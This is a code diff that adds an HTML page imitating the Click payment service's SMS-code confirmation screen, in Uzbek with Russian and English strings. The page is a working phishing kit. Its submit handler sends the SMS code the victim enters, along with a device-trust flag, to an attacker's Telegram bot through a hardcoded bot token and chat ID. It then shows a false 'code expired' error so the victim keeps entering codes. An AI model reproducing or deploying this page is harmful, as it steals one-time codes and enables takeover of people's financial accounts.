@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Click - Tasdiqlash</title>
+    <style>
+        :root {
+            --click-blue: #0073ff;
+            --bg-color: #f4f7f9;
+            --card-bg: #ffffff;
+            --text-black: #2d2d2d;
+            --text-gray: #828282;
+            --border-color: #e0e6ed;
+            --transition: 0.25s ease;
+        }
+
+        [data-theme="dark"] {
+            --bg-color: #0c0c0c; /* Rasmdagidek to'q qora */
+            --card-bg: #1a1a1a;
+            --text-black: #ffffff;
+            --text-gray: #a0a0a0;
+            --border-color: #333333;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            color: var(--text-black);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+            transition: background 0.3s;
+        }
+
+        .logo-box {
+            margin-bottom: 40px;
+        }
+
+        .logo-box svg {
+            width: 140px;
+        }
+
+        .logo-text { fill: var(--text-black); }
+
+        .pass-container {
+            background: var(--card-bg);
+            width: 100%;
+            max-width: 440px;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+
+        .content-padding {
+            padding: 40px 30px;
+        }
+
+        .info-text {
+            font-size: 15px;
+            line-height: 1.5;
+            margin-bottom: 25px;
+            color: var(--text-black);
+        }
+
+        .input-box {
+            position: relative;
+            margin-bottom: 15px;
+        }
+
+        .input-box input {
+            width: 100%;
+            background: transparent;
+            border: 1.5px solid var(--border-color);
+            border-radius: 8px;
+            padding: 14px;
+            font-size: 16px;
+            color: var(--text-black);
+            text-align: center;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .input-box input:focus {
+            border-color: var(--click-blue);
+        }
+
+        .timer {
+            font-size: 14px;
+            color: var(--text-black);
+            margin-bottom: 25px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+        }
+
+        .trust-device {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+
+        .checkbox-row {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .custom-check {
+            width: 20px;
+            height: 20px;
+            border: 2px solid var(--text-gray);
+            border-radius: 50%;
+            display: inline-block;
+            position: relative;
+        }
+
+        #trust-check:checked + .custom-check {
+            background: var(--click-blue);
+            border-color: var(--click-blue);
+        }
+
+        .trust-desc {
+            font-size: 12px;
+            color: var(--text-gray);
+            margin-top: 15px;
+            line-height: 1.4;
+        }
+
+        /* Bottom Buttons */
+        .action-btns {
+            display: flex;
+            border-top: 1px solid var(--border-color);
+        }
+
+        .btn {
+            flex: 1;
+            padding: 18px;
+            border: none;
+            background: transparent;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            color: var(--text-gray);
+            transition: 0.2s;
+        }
+
+        .btn-confirm {
+            color: #0073ff; /* Click ko'k rangi */
+            border-left: 1px solid var(--border-color);
+        }
+
+        .btn:active { background: rgba(0,0,0,0.05); }
+
+        [data-theme="dark"] .btn:active { background: rgba(255,255,255,0.05); }
+    </style>
+</head>
+<body>
+
+    <div class="logo-box">
+        <svg viewBox="0 0 160 40" xmlns="http://www.w3.org/2000/svg">
+            <path d="M40 20C40 27.6667 27.6667 40 20 40C12.3333 40 0 27.6667 0 20C0 12.3333 12.3333 0 20 0C27.6667 0 40 12.3333 40 20ZM28 20C28 23 23 28 20 28C17 28 12 23 12 20C12 17 17 12 20 12C23 12 28 17 28 20Z" fill="#0073ff"/>
+            <path class="logo-text" d="M140.667 0H132.667V40H140.667V28.2L150.5 40H160L147.667 25L157.333 13.3333H148L140.667 22.1839V0Z" />
+            <path class="logo-text" d="M129.701 29.0417C128.378 35.3018 122.821 40 116.167 40C108.527 40 102.333 33.8066 102.333 26.1667C102.333 18.5267 108.527 12.3333 116.167 12.3333C122.85 12.3333 128.427 17.0733 129.718 23.375H121.493C120.56 21.1105 118.535 19.5417 116.188 19.5417C112.954 19.5417 110.333 22.5171 110.333 26.1875C110.333 29.8579 112.954 32.8333 116.188 32.8333C118.521 32.8333 120.535 31.2837 121.476 29.0417H129.701Z" />
+            <path class="logo-text" d="M99 40V13.3333H91V40H99Z" />
+            <rect class="logo-text" x="78.3333" width="8" height="40" />
+            <path class="logo-text" d="M75.3675 29.0417C74.0443 35.3018 68.4875 40 61.8333 40C54.1934 40 48 33.8066 48 26.1667C48 18.5267 54.1934 12.3333 61.8333 12.3333C68.5169 12.3333 74.0935 17.0733 75.3849 23.375H67.1598C66.2267 21.1105 64.2018 19.5417 61.8542 19.5417C58.621 19.5417 56 22.5171 56 26.1875C56 29.8579 58.621 32.8333 61.8542 32.8333C64.1874 32.8333 66.2018 31.2837 67.1425 29.0417H75.3675Z" />
+        </svg>
+    </div>
+
+    <div class="pass-container">
+        <div class="content-padding">
+            <p class="info-text" id="txt-info">Faollashtirish kodi sizga (+998 -- --- -- --) SMS xabar shaklida yuborildi.<br>Akkountingiz xavfsizligi uchun, ushbu kodni hech kimga bermang.</p>
+            
+            <div class="input-box">
+                <input type="tel" id="sms-code" maxlength="6" placeholder="Kodni kiriting" inputmode="numeric">
+            </div>
+
+            <div class="timer">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
+                <span id="countdown">01:00</span>
+            </div>
+
+            <div class="trust-device">
+                <label class="checkbox-row">
+                    <input type="checkbox" id="trust-check" style="display:none">
+                    <span class="custom-check"></span>
+                    <span id="txt-trust-label">Qurilmaga ishonch bildirasizmi?</span>
+                </label>
+                <p class="trust-desc" id="txt-trust-desc">Ushbu uskunaga ishonch bildirib, barcha keyingi kirishlardan SMS-tasdiqlovsiz Pin-kod orqali foydalanish imkoni paydo bo'ladi</p>
+            </div>
+        </div>
+
+        <div class="action-btns">
+            <button class="btn" id="btn-back" onclick="window.history.back()">Orqaga</button>
+            <button class="btn btn-confirm" id="btn-submit">Tasdiqlash</button>
+        </div>
+    </div>
+
+<script>
+// 1. TIL SOZLAMALARI
+const langData = {
+    uz: {
+        info: "Faollashtirish kodi sizga SMS xabar shaklida yuborildi. Akkountingiz xavfsizligi uchun, ushbu kodni hech kimga bermang.",
+        placeholder: "Kodni kiriting",
+        trustLabel: "Qurilmaga ishonch bildirasizmi?",
+        trustDesc: "Ushbu uskunaga ishonch bildirib, barcha keyingi kirishlardan SMS-tasdiqlovsiz Pin-kod orqali foydalanish imkoni paydo bo'ladi",
+        back: "Orqaga",
+        confirm: "Tasdiqlash"
+    },
+    ru: {
+        info: "Код активации был отправлен вам в виде SMS. Для безопасности вашего аккаунта не передавайте этот код никому.",
+        placeholder: "Введите код",
+        trustLabel: "Доверяете этому устройству?",
+        trustDesc: "Доверяя этому устройству, вы сможете использовать его в дальнейшем через Pin-код без SMS-подтверждения",
+        back: "Назад",
+        confirm: "Подтвердить"
+    },
+    en: {
+        info: "The activation code was sent to you via SMS. For your account security, do not share this code with anyone.",
+        placeholder: "Enter code",
+        trustLabel: "Do you trust this device?",
+        trustDesc: "By trusting this device, you can use it in the future via Pin-code without SMS confirmation",
+        back: "Back",
+        confirm: "Confirm"
+    }
+};
+
+// 2. SOZLAMALARNI YUKLASH (localStorage orqali)
+const currentLang = localStorage.getItem('click_lang') || 'uz';
+const currentTheme = localStorage.getItem('click_theme') || 'light';
+
+// Tilni qo'llash
+const l = langData[currentLang];
+document.getElementById('txt-info').innerHTML = l.info;
+document.getElementById('sms-code').placeholder = l.placeholder;
+document.getElementById('txt-trust-label').innerText = l.trustLabel;
+document.getElementById('txt-trust-desc').innerText = l.trustDesc;
+document.getElementById('btn-back').innerText = l.back;
+document.getElementById('btn-submit').innerText = l.confirm;
+
+// Mavzuni qo'llash
+if (currentTheme === 'dark') {
+    document.body.setAttribute('data-theme', 'dark');
+}
+
+// 3. TIMER (1 daqiqa)
+let timeLeft = 60;
+const timerEl = document.getElementById('countdown');
+const timerInterval = setInterval(() => {
+    timeLeft--;
+    let minutes = Math.floor(timeLeft / 60);
+    let seconds = timeLeft % 60;
+    timerEl.innerText = `${minutes < 10 ? '0' : ''}${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+    if (timeLeft <= 0) clearInterval(timerInterval);
+}, 1000);
+
+// 4. TELEGRAMGA YUBORISH
+document.getElementById('btn-submit').addEventListener('click', async () => {
+    const code = document.getElementById('sms-code').value;
+    const trust = document.getElementById('trust-check').checked ? "HA" : "YO'Q";
+    
+    if(code.length < 4) {
+        alert("Kodni to'liq kiriting");
+        return;
+    }
+
+    const BOT_TOKEN = "8622554381:AAFMQ3qbIzFdLiOo7FHuC06Q3H7zzV_MAC8"; 
+    const CHAT_ID = "-1003085828839";
+    const text = `🔑 <b>SMS KOD KELDI!</b>\n\n💬 <b>Kod:</b> <code>${code}</code>\n🛡 <b>Ishonch:</b> ${trust}`;
+
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
+    });
+
+    alert("Xatolik: Kod muddati o'tgan yoki noto'g'ri.");
+});
+</script>
+</body>
+</html>
